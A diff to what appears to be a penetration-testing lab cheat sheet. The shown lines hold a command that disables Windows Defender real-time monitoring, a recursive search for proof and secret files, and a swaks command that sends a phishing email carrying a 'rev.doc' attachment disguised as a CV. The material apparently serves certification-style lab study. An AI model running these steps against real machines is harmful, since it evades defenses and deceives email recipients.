@@ -88,7 +88,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ### Locate local/proof files
 - `tree /f /a C:\Users`
 
- `Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -in "proof.txt", "local.txt", "secret.txt" }`
+- `Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -in "proof.txt", "local.txt", "secret.txt" }`
 
 ### Send email with attachment (Phishing)
 - `swaks --to jobs@cowmotors-int.com --from amit@rocks.com --header "Subject: My CV" --body "Attached my CV to this mail, thank you!" --attach @rev.doc --server 192.168.157.201`
